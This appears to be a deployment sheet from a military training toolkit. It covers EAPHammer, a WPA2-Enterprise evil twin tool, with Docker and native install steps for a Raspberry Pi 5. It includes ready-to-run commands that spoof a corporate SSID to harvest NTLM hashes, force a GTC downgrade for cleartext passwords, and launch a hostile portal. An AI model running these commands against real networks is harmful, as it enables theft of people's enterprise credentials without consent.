# EAPHammer

> **RISK CLASSIFICATION**: HIGH RISK - SENSITIVE SOFTWARE
> WPA2-Enterprise evil twin tool targeting 802.1X/EAP networks for credential harvesting, including RADIUS impersonation and certificate spoofing against enterprise authentication systems. Military education/training toolkit - Not for public release.

---

## Deployment Classification

> **RUNS ON ARGOS RPi 5: YES** — Python + hostapd-mana; hostapd compiles on ARM64, Python is arch-independent

| Method               | Supported | Notes                                                                                          |
| -------------------- | --------- | ---------------------------------------------------------------------------------------------- |
| **Docker Container** | YES       | Requires `--privileged`, `--net=host`, USB passthrough; hostapd-mana built at image build time |
| **Native Install**   | YES       | Clone from GitHub + setup; hostapd-mana compiles cleanly on aarch64; recommended               |

---

## Tool Description

EAPHammer is a purpose-built evil twin attack tool designed specifically for WPA2-Enterprise (802.1X) networks. Unlike general-purpose rogue AP tools, EAPHammer targets enterprise authentication mechanisms including EAP-PEAP, EAP-TTLS, EAP-TLS, and GTC downgrade attacks. It creates a rogue RADIUS server with spoofed certificates to capture enterprise credentials (domain usernames and NTLM/MSCHAPv2 hashes) when clients connect to the evil twin AP. EAPHammer automates certificate generation, hostapd-mana configuration, RADIUS server setup, and credential extraction into a single command-line workflow.

## Category

WPA2-Enterprise Evil Twin / 802.1X Exploitation

## Repository

https://github.com/s0lst1c3/eaphammer

---

## Docker Compatibility Analysis

### Can it run in Docker?

**YES** - EAPHammer runs in Docker with privileged access and host networking. It requires full wireless interface control for AP creation and a self-signed certificate chain for RADIUS authentication.

### Host OS-Level Requirements

- `--privileged` - Required for AP interface creation, RADIUS server binding, and monitor mode for deauthentication
- `--net=host` - Required for rogue AP operation, RADIUS authentication on port 1812/1813, DHCP, and DNS services
- `--device=/dev/bus/usb` - USB passthrough for external WiFi adapter
- Host kernel modules: `cfg80211`, `mac80211`, `mt76x2u` (Alfa adapter driver)
- hostapd-mana (patched hostapd with EAP credential logging) is bundled or built by EAPHammer

### Docker-to-Host Communication

- Rogue AP and RADIUS server operate via `--net=host`
- RADIUS on ports 1812/1813 (UDP), DHCP on 67/68, DNS on 53, HTTP captive portal on 80/443
- Captured credentials (NTLM hashes, cleartext passwords) via volume mount: `-v /host/output:/opt/eaphammer/loot`
- Certificate chain files can be mounted from host for persistent use

---

## Install Instructions (Docker on Kali RPi 5)

### Option A: Native Install (from source)

```bash
sudo apt update
sudo apt install -y git python3 python3-pip hostapd dnsmasq iw net-tools \
    wireless-tools openssl libssl-dev build-essential

git clone https://github.com/s0lst1c3/eaphammer.git /opt/eaphammer
cd /opt/eaphammer
sudo ./kali-setup
# or
sudo pip3 install -r pip.req

# Generate certificates
sudo python3 eaphammer --cert-wizard
```

### Option B: Docker

```dockerfile
FROM kalilinux/kali-rolling:latest

RUN apt-get update && apt-get install -y \
    git \
    python3 \
    python3-pip \
    python3-dev \
    hostapd \
    dnsmasq \
    iw \
    net-tools \
    wireless-tools \
    openssl \
    libssl-dev \
    build-essential \
    iptables \
    && rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/s0lst1c3/eaphammer.git /opt/eaphammer \
    && cd /opt/eaphammer \
    && pip3 install --break-system-packages -r pip.req 2>/dev/null; \
    ./kali-setup 2>/dev/null; true

WORKDIR /opt/eaphammer
ENTRYPOINT ["python3", "eaphammer"]
```

```bash
# Build
docker build -t argos/eaphammer .

# Generate certificates (first run)
docker run --rm -it \
  -v $(pwd)/eaphammer-certs:/opt/eaphammer/certs \
  -v $(pwd)/eaphammer-loot:/opt/eaphammer/loot \
  argos/eaphammer --cert-wizard

# Run - evil twin targeting WPA2-Enterprise with PEAP
docker run --rm -it \
  --privileged \
  --net=host \
  -v /dev/bus/usb:/dev/bus/usb \
  -v $(pwd)/eaphammer-certs:/opt/eaphammer/certs \
  -v $(pwd)/eaphammer-loot:/opt/eaphammer/loot \
  argos/eaphammer -i wlan1 --channel 6 \
  --auth wpa-enterprise --essid "CorpWiFi" --creds

# Run - GTC downgrade attack (capture cleartext passwords)
docker run --rm -it \
  --privileged \
  --net=host \
  -v /dev/bus/usb:/dev/bus/usb \
  -v $(pwd)/eaphammer-certs:/opt/eaphammer/certs \
  -v $(pwd)/eaphammer-loot:/opt/eaphammer/loot \
  argos/eaphammer -i wlan1 --channel 6 \
  --auth wpa-enterprise --essid "CorpWiFi" --negotiate balanced \
  --creds

# Run - with hostile portal for post-exploitation
docker run --rm -it \
  --privileged \
  --net=host \
  -v /dev/bus/usb:/dev/bus/usb \
  -v $(pwd)/eaphammer-certs:/opt/eaphammer/certs \
  -v $(pwd)/eaphammer-loot:/opt/eaphammer/loot \
  argos/eaphammer -i wlan1 --channel 6 \
  --auth wpa-enterprise --essid "CorpWiFi" --hostile-portal
```

---

## Kali Linux Raspberry Pi 5 Compatibility

### Architecture Support

**ARM64 COMPATIBLE** - EAPHammer is primarily Python with hostapd-mana as the compiled component. hostapd compiles cleanly on ARM64. The Python components are architecture-independent.

### Hardware Constraints

- CPU: Moderate load when running RADIUS server, hostapd, DHCP, and DNS simultaneously. Cortex-A76 handles this comfortably
- RAM: ~200-400MB with all services active. Well within 8GB
- WiFi: Requires adapter supporting AP mode. Alfa AWUS036AXML (mt76x2u) supports AP mode and is compatible. A second adapter for concurrent deauthentication is beneficial
- Certificates: EAPHammer generates its own certificate chain; no external CA infrastructure required

### Verdict

**COMPATIBLE** - EAPHammer runs on RPi5 with ARM64 support. The primary installation complexity is building hostapd-mana, which compiles on ARM64. This is the only tool in this category specifically designed for WPA2-Enterprise attacks, making it essential for enterprise WiFi assessment scenarios. Native install from source recommended.
